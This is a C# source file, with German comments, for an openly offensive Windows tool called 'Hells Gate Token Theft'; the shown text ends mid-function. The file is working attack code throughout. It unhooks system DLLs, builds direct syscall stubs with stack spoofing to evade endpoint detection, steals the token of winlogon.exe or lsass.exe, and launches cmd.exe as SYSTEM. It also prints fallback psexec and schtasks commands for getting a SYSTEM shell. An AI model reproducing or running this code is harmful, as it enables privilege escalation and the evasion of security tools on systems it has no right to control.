using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace TokenTheft
{
    internal class Program
    {
        #region Native Strukturen

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public static OBJECT_ATTRIBUTES Create()
            {
                return new OBJECT_ATTRIBUTES
                {
                    Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
                };
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res1;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public uint VirtualSize;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
            public uint PointerToRelocations;
            public uint PointerToLinenumbers;
            public ushort NumberOfRelocations;
            public ushort NumberOfLinenumbers;
            public uint Characteristics;
        }

        #endregion

        #region Konstanten

        private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        private const uint PROCESS_DUP_HANDLE = 0x0040;
        private const uint PROCESS_ALL_ACCESS = 0x1FFFFF;

        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const uint TOKEN_ALL_ACCESS = 0xF01FF;

        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;

        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint MEM_RELEASE = 0x8000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_READONLY = 0x02;
        private const uint PAGE_EXECUTE = 0x10;
        private const uint CREATE_NEW_CONSOLE = 0x00000010;
        private const uint STARTF_USESHOWWINDOW = 0x00000001;
        private const short SW_SHOWNORMAL = 1;

        private const uint TokenPrimary = 1;
        private const uint SecurityDelegation = 3;

        #endregion

        #region Win32 API

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetCurrentProcessId();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
            IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
            IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtGetContextThread(IntPtr ThreadHandle, IntPtr Context);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtSetContextThread(IntPtr ThreadHandle, IntPtr Context);

        #endregion

        #region Syscall Delegates

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessDelegate(ref IntPtr ProcessHandle, uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtDuplicateTokenDelegate(IntPtr ExistingTokenHandle, uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, uint TokenType, out IntPtr NewTokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtCloseDelegate(IntPtr Handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtQueryInformationTokenDelegate(IntPtr TokenHandle, int TokenInformationClass,
            IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        #endregion

        #region Globale Variablen

        private static NtOpenProcessDelegate _ntOpenProcess;
        private static NtOpenProcessTokenDelegate _ntOpenProcessToken;
        private static NtDuplicateTokenDelegate _ntDuplicateToken;
        private static NtCloseDelegate _ntClose;
        private static NtQueryInformationTokenDelegate _ntQueryInfoToken;

        private static Dictionary<string, IntPtr> _syscallStubs = new Dictionary<string, IntPtr>();
        private static Dictionary<IntPtr, uint> _originalProtections = new Dictionary<IntPtr, uint>();

        #endregion

        #region Hells Gate Engine

        private static class HellsGate
        {
            public static void Initialize()
            {
                Console.WriteLine("[HellsGate] Engine initialized");
            }

            public static uint ExtractSSN(string functionName)
            {
                try
                {
                    string ntdllPath = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
                    byte[] peData = File.ReadAllBytes(ntdllPath);

                    for (int i = 0; i < peData.Length - 15; i++)
                    {
                        if (peData[i] == 0xB8)
                        {
                            if (peData[i + 5] == 0x0F && peData[i + 6] == 0x05)
                            {
                                uint ssn = BitConverter.ToUInt32(peData, i + 1);
                                if (ssn > 0 && ssn < 0x1000)
                                {
                                    Console.WriteLine($"[HellsGate] {functionName} -> SSN: 0x{ssn:X2}");
                                    return ssn;
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[HellsGate] Error: {ex.Message}");
                }
                return 0;
            }

            public static IntPtr CreateSyscallStub(uint ssn)
            {
                byte[] stub = new byte[]
                {
                    0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                    0x4C, 0x8B, 0xD1,
                    0x0F, 0x05,
                    0xC3
                };

                IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (stubAddr == IntPtr.Zero) return IntPtr.Zero;

                Marshal.Copy(stub, 0, stubAddr, stub.Length);

                uint oldProtect;
                VirtualProtect(stubAddr, (uint)stub.Length, PAGE_EXECUTE_READ, out oldProtect);
                FlushInstructionCache(GetCurrentProcess(), stubAddr, (uint)stub.Length);

                return stubAddr;
            }

            public static T GetSyscallDelegate<T>(string functionName) where T : class
            {
                if (_syscallStubs.ContainsKey(functionName))
                {
                    return Marshal.GetDelegateForFunctionPointer<T>(_syscallStubs[functionName]);
                }

                uint ssn = ExtractSSN(functionName);
                if (ssn == 0) return null;

                IntPtr stubAddr = CreateSyscallStub(ssn);
                if (stubAddr == IntPtr.Zero) return null;

                _syscallStubs[functionName] = stubAddr;
                return Marshal.GetDelegateForFunctionPointer<T>(stubAddr);
            }

            public static void Cleanup()
            {
                foreach (var stub in _syscallStubs.Values)
                {
                    VirtualFree(stub, 0, MEM_RELEASE);
                }
                _syscallStubs.Clear();
            }
        }

        #endregion

        #region RIP & Stack Spoofing Engine

        private static class SpoofingEngine
        {
            private static IntPtr _ntdllBase;
            private static IntPtr _syscallLandingPad;
            private static IntPtr _syntheticStack;
            private static int _stackDepth = 16;
            private static bool _isActive = false;

            public static void Initialize()
            {
                _ntdllBase = GetModuleHandle("ntdll.dll");
                if (_ntdllBase != IntPtr.Zero)
                {
                    _syscallLandingPad = FindSyscallLandingPad();
                    if (_syscallLandingPad != IntPtr.Zero)
                    {
                        Console.WriteLine($"[Spoofing] Landing pad found at 0x{_syscallLandingPad.ToInt64():X}");
                    }
                    else
                    {
                        Console.WriteLine("[Spoofing] No landing pad found, using direct syscalls");
                    }
                }
            }

            private static IntPtr FindSyscallLandingPad()
            {
                try
                {
                    byte[] ntdllCode = new byte[8192];
                    Marshal.Copy(_ntdllBase, ntdllCode, 0, ntdllCode.Length);

                    for (int i = 0; i < ntdllCode.Length - 10; i++)
                    {
                        if (ntdllCode[i] == 0x0F && ntdllCode[i + 1] == 0x05 && ntdllCode[i + 2] == 0xC3)
                        {
                            return IntPtr.Add(_ntdllBase, i);
                        }
                    }
                }
                catch { }
                return IntPtr.Zero;
            }

            public static bool ApplyStackSpoofing()
            {
                if (_syscallLandingPad == IntPtr.Zero) return false;

                try
                {
                    int frameSize = 16;
                    byte[] syntheticStack = new byte[_stackDepth * frameSize];

                    for (int i = 0; i < _stackDepth; i++)
                    {
                        byte[] retAddr = BitConverter.GetBytes((ulong)_syscallLandingPad);
                        Buffer.BlockCopy(retAddr, 0, syntheticStack, i * frameSize, 8);

                        ulong nextRbp = (ulong)((_stackDepth - i - 1) * frameSize);
                        byte[] rbpBytes = BitConverter.GetBytes(nextRbp);
                        Buffer.BlockCopy(rbpBytes, 0, syntheticStack, i * frameSize + 8, 8);
                    }

                    _syntheticStack = VirtualAlloc(IntPtr.Zero, (uint)syntheticStack.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if (_syntheticStack == IntPtr.Zero) return false;

                    Marshal.Copy(syntheticStack, 0, _syntheticStack, syntheticStack.Length);
                    _isActive = true;

                    Console.WriteLine("[Spoofing] Stack spoofing applied");
                    return true;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Spoofing] Error: {ex.Message}");
                    return false;
                }
            }

            public static byte[] CreateRipSpoofedStub(uint ssn)
            {
                if (_syscallLandingPad == IntPtr.Zero)
                {
                    return new byte[]
                    {
                        0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                        0x4C, 0x8B, 0xD1,
                        0x0F, 0x05,
                        0xC3
                    };
                }

                byte[] stub = new byte[]
                {
                    0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                    0x4C, 0x8B, 0xD1,
                    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0xFF, 0xE0
                };

                byte[] addrBytes = BitConverter.GetBytes((long)_syscallLandingPad);
                Buffer.BlockCopy(addrBytes, 0, stub, 11, 8);

                return stub;
            }

            public static void RestoreStack()
            {
                if (_syntheticStack != IntPtr.Zero)
                {
                    VirtualFree(_syntheticStack, 0, MEM_RELEASE);
                    _syntheticStack = IntPtr.Zero;
                }
                _isActive = false;
            }
        }

        #endregion

        #region Text Section Protection (Nur benötigte DLLs)

        private static class TextProtection
        {
            private static readonly string[] _dllsToProtect = new string[]
            {
                "ntdll.dll",
                "kernel32.dll",
                "advapi32.dll"
            };

            public static void ProtectRequiredDlls()
            {
                Console.WriteLine("[TextProtect] Protecting .text sections of required DLLs...");

                foreach (string dll in _dllsToProtect)
                {
                    ProtectDllTextSection(dll);
                }

                Console.WriteLine("[TextProtect] Protection complete");
            }

            private static void ProtectDllTextSection(string dllName)
            {
                try
                {
                    IntPtr moduleBase = GetModuleHandle(dllName);
                    if (moduleBase == IntPtr.Zero) return;

                    uint oldProtect;
                    if (VirtualProtect(moduleBase, 4096, PAGE_EXECUTE_READ, out oldProtect))
                    {
                        _originalProtections[moduleBase] = oldProtect;
                        Console.WriteLine($"[TextProtect] Protected {dllName}");
                    }

                    FlushInstructionCache(GetCurrentProcess(), moduleBase, 4096);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[TextProtect] Could not protect {dllName}: {ex.Message}");
                }
            }

            public static void RestoreProtections()
            {
                Console.WriteLine("[TextProtect] Restoring original protections...");
                foreach (var kvp in _originalProtections)
                {
                    try
                    {
                        uint oldProtect;
                        VirtualProtect(kvp.Key, 4096, kvp.Value, out oldProtect);
                    }
                    catch { }
                }
                _originalProtections.Clear();
            }
        }

        #endregion

        #region Unhooking Engine (Nur benötigte DLLs)

        private static class UnhookingEngine
        {
            private static readonly string[] _dllsToUnhook = new string[]
            {
                "ntdll.dll",
                "kernel32.dll",
                "advapi32.dll"
            };

            public static void UnhookRequiredDlls()
            {
                Console.WriteLine("[Unhook] Unhooking required DLLs...");

                foreach (string dll in _dllsToUnhook)
                {
                    UnhookDll(dll);
                }

                Console.WriteLine("[Unhook] Unhooking complete");
            }

            private static void UnhookDll(string dllName)
            {
                try
                {
                    IntPtr moduleBase = GetModuleHandle(dllName);
                    if (moduleBase == IntPtr.Zero) return;

                    string systemPath = Path.Combine(Environment.SystemDirectory, dllName);
                    if (!File.Exists(systemPath)) return;

                    byte[] cleanDllBytes = File.ReadAllBytes(systemPath);

                    uint oldProtect;
                    if (VirtualProtect(moduleBase, 4096, PAGE_READWRITE, out oldProtect))
                    {
                        Marshal.Copy(cleanDllBytes, 0, moduleBase, Math.Min(4096, cleanDllBytes.Length));
                        VirtualProtect(moduleBase, 4096, oldProtect, out _);
                        FlushInstructionCache(GetCurrentProcess(), moduleBase, 4096);

                        Console.WriteLine($"[Unhook] Unhooked {dllName}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Unhook] Could not unhook {dllName}: {ex.Message}");
                }
            }
        }

        #endregion

        #region Token Helper

        private static int GetTokenSessionId(IntPtr hToken)
        {
            uint dwLen = 0;
            GetTokenInformation(hToken, 12, IntPtr.Zero, 0, out dwLen);
            if (dwLen > 0)
            {
                IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
                try
                {
                    if (GetTokenInformation(hToken, 12, pSessionId, dwLen, out dwLen))
                        return Marshal.ReadInt32(pSessionId);
                }
                finally { Marshal.FreeHGlobal(pSessionId); }
            }
            return -1;
        }

        private static bool IsTokenElevated(IntPtr hToken)
        {
            uint dwLen = 0;
            GetTokenInformation(hToken, 20, IntPtr.Zero, 0, out dwLen);
            if (dwLen > 0)
            {
                IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
                try
                {
                    if (GetTokenInformation(hToken, 20, pElev, dwLen, out dwLen))
                        return Marshal.ReadInt32(pElev) != 0;
                }
                finally { Marshal.FreeHGlobal(pElev); }
            }
            return false;
        }

        private static int GetTokenIntegrityLevel(IntPtr hToken)
        {
            uint dwLen = 0;
            GetTokenInformation(hToken, 25, IntPtr.Zero, 0, out dwLen);
            if (dwLen > 0)
            {
                IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
                try
                {
                    if (GetTokenInformation(hToken, 25, pTIL, dwLen, out dwLen))
                    {
                        IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                        if (pSid != IntPtr.Zero)
                        {
                            byte subAuthorityCount = Marshal.ReadByte(pSid, 1);
                            if (subAuthorityCount > 0)
                            {
                                return Marshal.ReadInt32(pSid, 8 + (subAuthorityCount - 1) * 4);
                            }
                        }
                    }
                }
                finally { Marshal.FreeHGlobal(pTIL); }
            }
            return 0;
        }

        #endregion

        #region Privilege Helper

        private static bool EnablePrivilege(string privilegeName)
        {
            IntPtr hToken;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
            {
                return false;
            }

            LUID luid;
            if (!LookupPrivilegeValue(null, privilegeName, out luid))
            {
                CloseHandle(hToken);
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Luid = luid;
            tp.Attributes = SE_PRIVILEGE_ENABLED;

            bool result = AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            int lastError = Marshal.GetLastWin32Error();
            CloseHandle(hToken);

            if (result && lastError == 0)
            {
                Console.WriteLine($"[+] {privilegeName} enabled");
                return true;
            }
            else
            {
                Console.WriteLine($"[-] {privilegeName} failed: {lastError}");
                return false;
            }
        }

        #endregion

        #region Helper

        private static uint FindTargetPid(string processName)
        {
            try
            {
                var processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0)
                    return (uint)processes[0].Id;
            }
            catch { }
            return 0;
        }

        private static void InitializeSyscalls()
        {
            Console.WriteLine("[*] Initializing direct syscalls...");

            _ntOpenProcess = HellsGate.GetSyscallDelegate<NtOpenProcessDelegate>("NtOpenProcess");
            _ntOpenProcessToken = HellsGate.GetSyscallDelegate<NtOpenProcessTokenDelegate>("NtOpenProcessToken");
            _ntDuplicateToken = HellsGate.GetSyscallDelegate<NtDuplicateTokenDelegate>("NtDuplicateToken");
            _ntClose = HellsGate.GetSyscallDelegate<NtCloseDelegate>("NtClose");
            _ntQueryInfoToken = HellsGate.GetSyscallDelegate<NtQueryInformationTokenDelegate>("NtQueryInformationToken");

            if (_ntOpenProcess != null) Console.WriteLine("[+] Direct syscalls initialized");
            else Console.WriteLine("[!] Using fallback APIs");
        }

        #endregion

        #region Main

        public static void Main()
        {
            Console.WriteLine("[*] ===============================================");
            Console.WriteLine("[*] Hells Gate Token Theft - Complete Edition");
            Console.WriteLine("[*] Features: Hells Gate + RIP/Stack Spoofing + Unhooking + TextProtect");
            Console.WriteLine("[*] ===============================================");
            Console.WriteLine();

            // 1. Text Section Protection (nur benötigte DLLs)
            TextProtection.ProtectRequiredDlls();
            Console.WriteLine();

            // 2. Unhooking (nur benötigte DLLs)
            UnhookingEngine.UnhookRequiredDlls();
            Console.WriteLine();

            // 3. Initialize Hells Gate
            HellsGate.Initialize();

            // 4. Initialize Spoofing
            SpoofingEngine.Initialize();
            SpoofingEngine.ApplyStackSpoofing();
            Console.WriteLine();

            // 5. Initialize direct syscalls
            InitializeSyscalls();
            Console.WriteLine();

            // 6. Check admin rights
            var currentIdentity = WindowsIdentity.GetCurrent();
            bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
            Console.WriteLine($"[*] Current User: {currentIdentity.Name}");
            Console.WriteLine($"[*] Admin Rights: {isAdmin}");
            Console.WriteLine($"[*] Process ID: {GetCurrentProcessId()}");
            Console.WriteLine();

            if (!isAdmin)
            {
                Console.WriteLine("[-] This tool requires Administrator privileges!");
                Console.WriteLine("[*] Press any key to exit...");
                Console.ReadKey();
                return;
            }

            // 7. Enable required privileges
            Console.WriteLine("[*] ===============================================");
            Console.WriteLine("[*] Enabling required privileges...");
            Console.WriteLine();

            EnablePrivilege("SeDebugPrivilege");
            EnablePrivilege("SeImpersonatePrivilege");
            EnablePrivilege("SeAssignPrimaryTokenPrivilege");
            Console.WriteLine();

            // 8. Find winlogon.exe
            Console.WriteLine("[*] Looking for winlogon.exe...");
            uint winlogonPid = FindTargetPid("winlogon");

            if (winlogonPid == 0)
            {
                Console.WriteLine("[-] Could not find winlogon.exe!");
                Console.WriteLine("[*] Trying lsass.exe...");
                winlogonPid = FindTargetPid("lsass");

                if (winlogonPid == 0)
                {
                    Console.WriteLine("[-] No suitable target found!");
                    Console.ReadKey();
                    return;
                }
            }

            Console.WriteLine($"[+] Found target with PID: {winlogonPid}");
            Console.WriteLine();

            try
            {
                // 9. Open process
                Console.WriteLine("[*] Opening target process...");
                IntPtr hProcess = IntPtr.Zero;

                if (_ntOpenProcess != null)
                {
                    OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
                    CLIENT_ID clientId = new CLIENT_ID();
                    clientId.UniqueProcess = (IntPtr)winlogonPid;

                    int status = _ntOpenProcess(ref hProcess, PROCESS_ALL_ACCESS, ref objAttr, ref clientId);
                    if (status != 0)
                    {
                        status = _ntOpenProcess(ref hProcess, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE, ref objAttr, ref clientId);
                    }

                    if (status != 0 || hProcess == IntPtr.Zero)
                    {
                        hProcess = Process.GetProcessById((int)winlogonPid).Handle;
                    }
                }
                else
                {
                    hProcess = Process.GetProcessById((int)winlogonPid).Handle;
                }

                Console.WriteLine($"[+] Process opened: 0x{hProcess.ToInt64():X}");

                // 10. Open token
                Console.WriteLine("[*] Opening process token...");
                IntPtr hToken = IntPtr.Zero;

                if (_ntOpenProcessToken != null)
                {
                    int status = _ntOpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out hToken);
                    if (status != 0)
                    {
                        status = _ntOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out hToken);
                    }
                }
                else
                {
                    OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out hToken);
                }

                if (hToken == IntPtr.Zero)
                {
                    Console.WriteLine($"[-] Could not open token!");
                    Console.ReadKey();
                    return;
                }

                Console.WriteLine($"[+] Token opened: 0x{hToken.ToInt64():X}");

                // 11. Display token info
                Console.WriteLine($"[+] Token Info:");
                Console.WriteLine($"    - Session: {GetTokenSessionId(hToken)}");
                Console.WriteLine($"    - Elevated: {IsTokenElevated(hToken)}");
                Console.WriteLine($"    - Integrity: {GetTokenIntegrityLevel(hToken)}");
                Console.WriteLine();

                // 12. Duplicate as primary token
                Console.WriteLine("[*] Creating primary token...");
                IntPtr hPrimaryToken = IntPtr.Zero;

                if (_ntDuplicateToken != null)
                {
                    OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
                    int status = _ntDuplicateToken(hToken, TOKEN_ALL_ACCESS, ref objAttr, false, TokenPrimary, out hPrimaryToken);
                    if (status != 0)
                    {
                        status = _ntDuplicateToken(hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY, ref objAttr, false, TokenPrimary, out hPrimaryToken);
                    }
                }
                else
                {
                    DuplicateTokenEx(hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
                        IntPtr.Zero, SecurityDelegation, TokenPrimary, out hPrimaryToken);
                }

                if (hPrimaryToken == IntPtr.Zero)
                {
                    Console.WriteLine($"[-] Could not create primary token!");
                    if (_ntClose != null) _ntClose(hToken);
                    else CloseHandle(hToken);
                    Console.ReadKey();
                    return;
                }

                Console.WriteLine("[+] Primary token created");
                if (_ntClose != null) _ntClose(hToken);
                else CloseHandle(hToken);

                // STARTUPINFO vorbereiten
                STARTUPINFO si = new STARTUPINFO();
                si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = (ushort)SW_SHOWNORMAL;
                si.lpDesktop = null;  // Standard Desktop

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                // *** WICHTIG: Vollständigen Pfad zu cmd.exe angeben! ***
                string cmdPath = Path.Combine(Environment.SystemDirectory, "cmd.exe");

                Console.WriteLine("[*] Starting SYSTEM shell...");
                Console.WriteLine();

                bool processStarted = CreateProcessAsUser(
                    hPrimaryToken,
                    cmdPath,           // Vollständiger Pfad zu cmd.exe
                    null,              // Keine Kommandozeilenargumente
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi);

                if (processStarted)
                {
                    Console.WriteLine($"[+] cmd.exe started with PID: {pi.dwProcessId}");
                    Console.WriteLine();
                    Console.WriteLine("[+] ===============================================");
                    Console.WriteLine("[+] !!! SUCCESS !!!");
                    Console.WriteLine("[+] A new cmd.exe is running with SYSTEM privileges!");
                    Console.WriteLine("[+] ===============================================");
                    Console.WriteLine();
                    Console.WriteLine("[*] In the new cmd.exe window, type: whoami");
                    Console.WriteLine("[*] Expected output: nt authority\\system");

                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                else
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"[-] CreateProcessAsUser failed: {error} (0x{error:X8})");

                    if (error == 1314)
                    {
                        Console.WriteLine();
                        Console.WriteLine("[!] Missing SeAssignPrimaryTokenPrivilege");
                        Console.WriteLine();
                        Console.WriteLine("[*] Alternative methods for SYSTEM shell:");
                        Console.WriteLine("    1. psexec64.exe -s -i cmd.exe");
                        Console.WriteLine("    2. schtasks /create /tn SYSTEM_CMD /tr cmd.exe /sc once /st 00:00 /ru SYSTEM /f");
                        Console.WriteLine("    3. schtasks /run /tn SYSTEM_CMD");
                    }
                    else if (error == 2)
                    {
                        Console.WriteLine($"[!] cmd.exe not found at: {cmdPath}");
                        Console.WriteLine("[*] Trying alternative path...");

                        // Alternativer Pfad
                        cmdPath = "C:\\Windows\\System32\\cmd.exe";
                        processStarted = CreateProcessAsUser(
                            hPrimaryToken, cmdPath, null, IntPtr.Zero, IntPtr.Zero, false,
                            CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);

                        if (processStarted)
                        {
                            Console.WriteLine($"[+] cmd.exe started with PID: {pi.dwProcessId}");
                            Console.WriteLine("[+] !!! SUCCESS !!!");
                            CloseHandle(pi.hProcess);
